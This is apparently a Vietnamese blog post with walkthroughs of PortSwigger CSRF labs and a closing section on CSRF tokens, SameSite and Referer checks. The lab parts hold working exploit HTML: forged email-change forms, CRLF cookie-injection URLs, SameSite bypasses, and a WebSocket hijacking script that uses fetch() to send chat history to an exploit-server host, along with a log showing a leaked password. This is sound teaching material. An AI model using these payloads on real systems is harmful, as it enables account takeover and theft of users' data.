---
title: "[PortSwigger Lab] - Cross Site Request Forgery"
description: Solution of Cross Site Request Forgery on PortSwigger Lab
date: 2025-06-02 22:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, csrf]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-02-portswigger-lab-cross-site-request-forgery/csrf.png
    alt: Cross Site Request Forgery
---

## Introduction
---
### What is CSRF?
**CSRF (Cross-site request forgery)** hay giả mạo yêu cầu từ trang chéo là một lỗ hổng bảo mật trên web, cho phép kẻ tấn công lừa người dùng thực hiện các hành động mà họ không mong muốn trên một trang web mà họ đã đăng nhập.
Nó phần nào phá vỡ chính sách cùng nguồn gốc **(same-origin policy)** – vốn được thiết kế để ngăn các trang web khác nhau can thiệp vào nhau.

### Impact of a CSRF attack
Khi **CSRF** thành công, nạn nhân sẽ vô tình thực hiện một hành động nào đó, ví dụ như:
- Thay đổi địa chỉ email trong tài khoản của họ.
- Đổi mật khẩu.
- Thực hiện chuyển khoản tiền.

Nếu hành động đó đủ nghiêm trọng, kẻ tấn công có thể chiếm quyền điều khiển toàn bộ tài khoản của nạn nhân. Nếu nạn nhân là người có quyền cao (admin chẳng hạn), hậu quả có thể là toàn bộ hệ thống bị kiểm soát.

### How CSRF work?
Để CSRF có thể xảy ra, cần có 3 điều kiện chính:
1. Có hành động liên quan: Ví dụ: đổi mật khẩu, thay email, chuyển tiền,… tức là một hành động mà kẻ tấn công muốn "ép" người dùng thực hiện.

2. Xử lý phiên dựa vào **cookie**: Trang web xác định người dùng qua cookie phiên. Không có các cơ chế bảo vệ khác như token xác thực **(CSRF token)**.

3. Không có tham số khó đoán: Nếu URL yêu cầu không chứa thông tin mà kẻ tấn công không biết (ví dụ mật khẩu cũ), thì kẻ tấn công có thể dễ dàng giả mạo yêu cầu.

## Exploit CSRF Lab
Tạo mã khai thác CSRF bằng Burp Suite Pro: Chuột phải → Engagement tools → Generate CSRF PoC.

---
### Lab: CSRF vulnerability with no defenses
- Đăng nhập với tài khoản được cấp
- Update email, gửi request update email tới **repeater**
```http
POST /my-account/change-email HTTP/2
Host: 0a9400fc04dbc0a680c603b800f100c8.web-security-academy.net
...
email=c%40gmail.com
```
- Tạo mã khai thác CSRF, và thay đổi email 
```html
    <html>
    <body>
        <form action="https://0a9400fc04dbc0a680c603b800f100c8.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="evil&#64;gmail&#46;com" />
        <input type="submit" value="Submit request" />
        </form>
        <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
        </script>
    </body>
    </html>
```
- Đến **exploit server**
- Dán mã khai thác vào body 
- Deliver to victim

### Lab: CSRF where token validation depends on request method
#### Analyis
- Đăng nhập với tài khoản được cấp
- Update email, gửi request update email tới **repeater**
```http
POST /my-account/change-email HTTP/2
Host: 0a9400fc04dbc0a680c603b800f100c8.web-security-academy.net
...
email=c%40gmail.com&csrf=abcd
```
- Thử gửi không kèm **csrf** nhận được thông báo `"Missing parameter 'csrf'"`
- Ý tưởng: Thay đổi **POST** sang **GET**, gửi không đính kèm **csrf**

#### Exploit
- Chuột phải > Change request method 
- Gửi lại request không **kèm csrf** -> thành công
- Tạo mã khai thác CSRF, và thay đổi email 
```html
    <form action="https://0ace008a036892158105c2af00eb0072.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="abc@gmail.com">
    </form>
    <script>
            document.forms[0].submit();
    </script>
```
- Đến **exploit server**
- Dán mã khai thác vào body 
- Deliver to victim

> Lỗi do cấu hình xử lý method

### Validation of CSRF token depends on token being present
- Đăng nhập với tài khoản được cấp
- Update email, gửi request update email tới **repeater**
```http
POST /my-account/change-email HTTP/2
Host: 0a9400fc04dbc0a680c603b800f100c8.web-security-academy.net
...
email=c%40gmail.com&csrf=abcd
```
- Thử gửi không kèm **csrf** -> Thành công 
- Một số ứng dụng chỉ kiểm tra tính hợp lệ của `CSRF token` nếu tham số `csrf` tồn tại trong request.
- Tạo mã khai thác CSRF, thay đổi email, bỏ `csrf token` khỏi request
```html
    <form action="https://0a4e006304446a75803a172d00ae00f9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="evil@gmail.com" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
```

- Đến **exploit server**
- Dán mã khai thác vào body 
- Deliver to victim

### Lab: CSRF where token is not tied to user session
- Đăng nhập với tài khoản được cấp
- Đến tab **Proxy**, bật **Intercept**
- Update email
- **Proxy** > **Intercept**, tìm đến tab chứa request **update email**
- Tạo mã khai thác CSRF, thay đổi email, copy mã
- Drop request, tắt **Intercept**
- Đến **exploit server**
- Dán mã khai thác vào body 
- Deliver to victim

Nyên lý hoạt động:
- Một số ứng dụng tạo và xác thực `CSRF token` mà không ràng buộc token đó với phiên đăng nhập (**session**) cụ thể của người dùng. Thay vào đó, hệ thống chỉ kiểm tra xem token đó có nằm trong danh sách token đã phát hành hay không.
- Do đó có thể sử dụng `CSRF token` để khai thác

### CSRF token is tied to a non-session cookie
Một số ứng dụng cố gắng bảo vệ chống lại **CSRF** bằng cách gắn token với cookie, nhưng lại không gắn với cookie dùng để quản lý phiên đăng nhập (**session cookie**). Thay vào đó, token được gắn với một cookie phụ khác, ví dụ **csrfKey**.

#### Determine the behavior of CSRF tokens
- Đăng nhập vào tài khoản A bằng trình duyệt của **Burp Suite**.
- Gửi form "Update email", kiểm tra request trong tab **Proxy History**.

#### Test the relationship between **session** and **csrfKey**
Gửi request này sang tab Repeater trong Burp để test:
- Thay đổi giá trị **cookie session** → bị đăng xuất → phiên thực sự phụ thuộc vào cookie này.
- Thay đổi giá trị **cookie csrfKey** → request bị từ chối do sai token → csrfKey không gắn chặt với session.
**Kết luận:** CSRF token trong cookie csrfKey không ràng buộc với session.

#### Test token from account A to account B
- Mở cửa sổ ẩn danh, đăng nhập bằng tài khoản B.
- Gửi yêu cầu đổi email từ tài khoản B trong Burp.
- Trong Burp Repeater:
    - Dán csrfKey cookie và giá trị csrf từ tài khoản A vào request của tài khoản B.
    - Request vẫn thành công → tức là token CSRF từ tài khoản A dùng được cho tài khoản B, vì không bị ràng buộc bởi session.

#### Find cookie insertion point from client
- Quay lại tab trình duyệt ban đầu (đã đăng nhập tài khoản A).
- Gửi một truy vấn tìm kiếm (search).
- Quan sát thấy nội dung tìm kiếm bị phản hồi lại trong header:
```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=abc; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3419
```

**Ý tưởng:** định dạng chuỗi tìm kiếm một cách khéo léo, có thể ép server gửi **Set-Cookie** độc hại về trình duyệt nạn nhân.

#### Create URL to inject cookie into victim browser
```
"/?search=abc%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b..."
```

- `%0d%0a (\r\n)` là kí tự xuống dòng trong HTTP header.
- Chuỗi `/search?...` sẽ ép server phản hồi:
```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=abc
Set-Cookie: csrfKey=sL7zNuuRkOfaT3LTlOCT2GkNLa8QKzYK;SameSite=None; Secure; HttpOnly
```

Khi người dùng truy cập vào URL này, trình duyệt sẽ lưu lại cookie csrfKey do kẻ tấn công chỉ định.

#### Create and host an exploit to automatically send CSRF requests
- Đến request `change email` tạo mã khai thác CSRF
- Lấy **token** tại **response** của `/my-account`
```html
    <form action="https://0a9300f203c2f67c809c037400ce0063.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="csrf" value="ubbY8fvXWI9r55sxmIbPGZXN1fXcOMW1">
        <input type="hidden" name="email" value="evil@gmail.com">
        <img src="https://0a9300f203c2f67c809c037400ce0063.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=WKT3HORZFW74kJQyzwoD3zk0w3d0g0eK%3b%20SameSite=None" onerror="document.forms[0].submit()">    
    </form>
```
- Thay vì gửi ngay `(<script>form.submit()</script>)`, chèn một thẻ ảnh để tiêm cookie trước:
- Đến **Exploit Server**
- Dán mã khai thác vào body 
- Deliver to victim

### Lab: CSRF where token is duplicated in cookie
#### Analysis
Là một cách đơn giản để bảo vệ khỏi CSRF mà:
- Server không lưu trữ **CSRF token (stateless)**.
- Khi người dùng đăng nhập, ứng dụng:
    - Sinh ra một **CSRF token**.
    - Gửi token này vào **cookie** (ví dụ: csrf=abc123).
- Đồng thời, mỗi request (ví dụ: POST đổi email) phải đính kèm token trong body hoặc header (ví dụ: csrf=abc123 trong request body).
- Nếu hai giá trị này trùng nhau, server chấp nhận request.

Đây là cơ chế bảo vệ CSRF được gọi là **"double submit cookie"**

#### Exploit
- Login bằng tài khoản được cấp
- Thực hiện chức năng **change-email**
- Test việc thay đổi làm cho csrf khác nhau giữa **Header** và **Body**, sẽ nhận được `"Invalid CSRF token"`
- Nhưng làm cho chúng giống nhau, không phải csrf ban đầu vẫn thực hiện được thay đổi email
```http
POST /my-account/change-email HTTP/2
Host: 0ab800d604cd71ed80c403f400cc009b.web-security-academy.net
Cookie: csrf=xnxx; session=pRQywNtRwp6nBB9KjblS1iTs4WNr3IGC
...
email=evil%40gmail.com&csrf=xnxx
```

=> Cho thấy server không lưu trữ csrf mà chỉ so sánh csrf giữa **Header** và **Body**
- Tạo mã khai thác tưởng tự như lab trên nhưng thay đổi **csrf** để chúng có giá trị giống nhau
```html
  <form action="https://0ab800d604cd71ed80c403f400cc009b.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="csrf" value="xnxx">
      <input type="hidden" name="email" value="evil@gmail.com">
      <img src="https://0ab800d604cd71ed80c403f400cc009b.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=xnxx%3b%20SameSite=None" onerror="document.forms[0].submit()">    
  </form>
```
- Response cho request **search**
```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=abc
Set-Cookie: csrf=xnxx; SameSite=None; Secure; HttpOnly
```
- Đến **Exploit Server**
- Dán mã khai thác vào body 
- Deliver to victim

### Lab: SameSite Lax bypass via method override
#### Determine type of **SameSite**
- Login bằng tài khoản được cấp
- Thực hiện **change-email**
- Quan sát các response, nhận thấy không có SameSite nào được server chỉ định 
=> SameSite Lax được sử dụng mặc định bởi **Chrome**

#### Exploit
- Thay đổi method và thực hiện change-email => `"Method Not Allowed"`
- Overwrite method => thành công
```http
GET /my-account/change-email?email=evil%40gmail.com&_method=POST HTTP/2
Host: 0a4d00ba046d90da817a8e1300b0005c.web-security-academy.net
```
- Tạo mã khai thác
```html
<script>
    document.location="https://0a4d00ba046d90da817a8e1300b0005c.web-security-academy.net/my-account/change-email?email=evil%40gmail.com&_method=POST";
</script>
```
- Deliver to victim

> Tham số _method sẽ **chỉ có hiệu lực nếu phía server (framework) hỗ trợ và xử lý nó. 
{: .prompt-info }

### Lab: SameSite Strict bypass via client-side redirect
#### Determine type of **SameSite**
- Login bằng tài khoản được cấp
- Thực hiện **change-email**
- Quan sát các response, nhận thấy `SameSite=Strict` được set trong response

#### Determine redirect location
- Post 1 comment, trang web sẽ redirect sau vài giây(s)
```html
<script>redirectOnConfirmation('/post');</script>
```
- Mã nguồn redirect:
```js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

- Trang web sẽ redirect đến post có id là `postId` sau khi comment
- Lợi dụng điều này để thực hiện điều hướng bằng `traversal sequences(../)`
- Thử truy cập `/post/comment/confirmation?postId=../../my-account` => thực sự redirect đến

#### Exploit
- Tạo mã khai thác
```html
<script>
    document.location = "https://0a22006603294d068041e9f900eb00a8.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=abc%40gmail.com%26submit=1";
</script>
```
- Vì sao phải URL-encode dấu & thành %26
    - Phần khai thác ở trên đang nằm trong giá trị của query param postId.
    - Nếu bạn để &submit=1 trần, trình duyệt sẽ hiểu đó là một tham số mới của request gốc (confirmation?postId=...&submit=1), không phải phần đuôi của đường dẫn sau khi “trườn” ra ngoài.
    - Encode & thành %26 để nó được truyền nguyên vẹn vào URL đích sau khi “chạy lùi”.

### SameSite Strict bypass via sibling domain
#### Study the live chat feature
- Sử dụng chức năng **live chat** 
- Quan sát **Proxy > HTTP history** và tìm yêu cầu bắt tay **WebSocket.** Đây phải là yêu cầu **GET /chat** gần đây nhất, không chứa bất kỳ mã thông báo không thể đoán trước nào, vì vậy có thể dễ bị tổn thương bởi CSWSH.
- Quan sát **Proxy > WebSockets History**, ta thấy để bắt đầu, **client** gửi `READY` đến **server**, khiến máy chủ phản hồi toàn bộ cuộc trò chuyện

#### Confirm the CSWSH vulnerability
- Đến **Exploite Server**, tạo payload thực hiện kiểm thử khai thác
```html
    <script>
        var ws = new WebSocket('wss://0aa3004c042e0976802a3f020009003e.web-security-academy.net/chat');
        ws.onopen = function() {
            ws.send("READY");
        };
        ws.onmessage = function(event) {
            fetch("https://exploit-0a3c0031049f090880073e4c0119005a.exploit-server.net/exploit" + event.data);
        };
    </script>
```
- Deliver to victim
- Đến **access log**, ta nhận được phần `event.data`
```
%7B%22user%22:%22CONNECTED%22,%22content%22:%22--%20Now%20chatting%20with%20Hal%20Pline%20--%22%7D HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```
- Đến **Burp Decoder**, thực hiện **smart decode**
```
{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"} HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```
- Mặc dù xác nhận đã có lỗ hổng **CSWSH**, nhưng nội dung cuộc trò chuyện lấy được hoàn toàn mới của new session
- Nguyên nhân
    - **SameSite** nhận được là `SameSite=Strict`
    - Script được khai thác từ trang ngoài domain

=> Trình duyệt không gửi cookie từ trang ngoài domain với thuộc tính `SameSite=Strict`, đây là cơ chế bảo vệ người dùng của trình duyệt

- Ý tưởng: 
    - Khai thác dựa trên lỗi XSS của chính trang
    - Khác thác dự trên lỗi XSS của trang khác same-site

#### Exploit
- Quan sát các response cũ trong **Proxy > HTTP history**, ta thấy được **Access-Control-Allow-Origin** header với sibling domain `https://cms-0aa3004c042e0976802a3f020009003e.web-security-academy.net`
- Thử đăng nhập bằng username `<script>alert()</script>` và password tùy ý, ta thấy XSS xảy ra
- Change request method và ứng dụng vẫn chấp nhận nó
- Do là same-site nến cookie có thể gửi được từ `cms-...` đến trang chúng ta khai thác
- Từ trang này, ta tạo payload để khởi tạo **WebSocket** tới `https://0aa3004c042e0976802a3f020009003e.web-security-academy.net`
    - Khi khởi tạo, do cùng domain gốc nên trình duyệt sẽ gửi **Cookie** kèm theo
    - Do có **cookie** nên `event.data` trả về có lịch sử tương ứng với **cookie** đó

- Payload:
```html
    <script>
        document.location = "https://cms-0afd001a038e866c80d053ab00fd0074.web-security-academy.net/login?username=%3Cscript%3Evar%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0afd001a038e866c80d053ab00fd0074.web-security-academy.net%2Fchat%27%29%3Bws.onopen%20%3D%20function%28%29%20%7Bws.send%28%22READY%22%29%3B%7D%3Bws.onmessage%20%3D%20function%28event%29%20%7Bfetch%28%22https%3A%2F%2Fexploit-0a59006c039186ad80ca52df012c00a5.exploit-server.net%2Fexploit%22%20%2B%20event.data%29%3B%7D%3B%3C%2Fscript%3E&password=abc";
    </script>
```

- Khi decode ra nó như này:
```html
    <script>
        document.location = "https://cms-0afd001a038e866c80d053ab00fd0074.web-security-academy.net/login?username=<script>var ws = new WebSocket('wss://0afd001a038e866c80d053ab00fd0074.web-security-academy.net/chat');ws.onopen = function() {ws.send("READY");};ws.onmessage = function(event) {fetch("https://exploit-0a59006c039186ad80ca52df012c00a5.exploit-server.net/exploit" + event.data);};</script>&password=abc";
    </script>
```

- Dán vào body của **Exploit Server** > Deliver to victiom
- Truy cập **access log**, copy data thu được và decode bằng smart decode của **Burp Decoder**
- Sử dụng thông tin đăng nhập có được từ **chat history** để đăng nhập
```
10.0.3.134      2025-06-06 03:47:06 +0000 "GET /exploit{"user":"Hal Pline","content":"No problem carlos, it's re7x1159ugzypdjnrfzt"} HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

## Prevent
---
Hiện nay, để khai thác thành công một lỗ hổng **CSRF**, kẻ tấn công thường phải vượt qua các biện pháp phòng vệ được triển khai bởi website mục tiêu, trình duyệt của nạn nhân, hoặc cả hai.
### CSRF Token 
- Là một chuỗi ngẫu nhiên, bí mật và không đoán được được máy chủ tạo ra và gửi cho client (trình duyệt).
- Khi người dùng thực hiện hành động nhạy cảm (ví dụ gửi form), trình duyệt phải gửi lại **CSRF token** đó kèm theo yêu cầu.
- Kẻ tấn công không biết token nên không thể gửi yêu cầu hợp lệ, ngay cả khi có thể ép nạn nhân thực hiện hành động.

### SameSite Cookie
- Là một thuộc tính của **cookie** giúp trình duyệt kiểm soát xem **cookie** có nên được gửi đi hay không trong các **request** giữa các trang web khác nhau **(cross-site request)**.
- Các chế độ
    - **SameSite=Strict:** Cookie chỉ được gửi khi người dùng truy cập trực tiếp (không gửi qua các trang web khác).
    - **SameSite=Lax:** Cookie vẫn được gửi trong một số tình huống thông thường như nhấn link, nhưng không gửi với form POST từ trang khác.
    - **SameSite=None:** Cho phép gửi cookie từ bất kỳ nguồn nào (phải có Secure).
- Kể từ năm 2021, trình duyệt **Chrome** mặc định sử dụng **SameSite=Lax**, giúp giảm thiểu CSRF mà không ảnh hưởng nhiều đến trải nghiệm người dùng.

### Referer (Referer-based validation)
Ứng dụng kiểm tra **header Referer** trong yêu cầu HTTP để xác định xem nó có đến từ chính trang web của mình hay không.
- Nhược điểm:
    - Referer có thể bị chặn hoặc xóa bởi trình duyệt, plugin, hoặc cấu hình bảo mật.
    - Không phải lúc nào cũng đáng tin cậy và dễ bị bỏ qua, vì vậy không nên dùng làm biện pháp duy nhất.

---
Goodluck! 🍀🍀🍀